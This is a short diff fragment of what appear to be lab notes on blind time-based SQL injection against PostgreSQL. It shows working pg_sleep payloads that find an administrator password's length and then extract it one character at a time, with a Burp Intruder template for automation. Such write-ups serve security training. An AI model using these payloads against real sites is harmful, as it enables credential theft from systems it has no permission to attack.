@@ -15,4 +15,6 @@ Or use conditional statement
 '; SELECT CASE WHEN (username='administrator' AND length(password)>19) THEN pg_sleep(5) ELSE pg_sleep(0) END from users-
 The password length is 20 character
 
-4. 
+4. Test the character at each position. Set concurrent requests to 1 from resource pool before launching the intruder attack 
+'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END from users--
+'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
